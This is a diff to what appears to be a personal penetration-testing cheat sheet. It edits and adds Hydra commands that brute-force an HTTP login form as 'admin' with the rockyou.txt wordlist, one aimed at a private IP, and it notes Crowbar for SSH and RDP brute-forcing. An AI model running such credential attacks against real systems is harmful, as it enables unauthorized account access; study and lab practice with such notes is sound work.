@@ -290,8 +290,9 @@ wc # word count
         -M module -q  : check the available modules
 
     hydra
-        hydra IP http-form-post "url.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P rockyou.txt -vV -f 
+        hydra IP http-form-post "/**/url.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P rockyou.txt -vV -f 
             ^PASS^ a label
+        hydra 172.16.33.43 http-form-post "/admin/index.php:user=admin&pass=^PASS^:Bad" -l admin -P rockyou.txt -vV -f
     
     crowbar
         ssh pub key brute, and win RDP psw brute
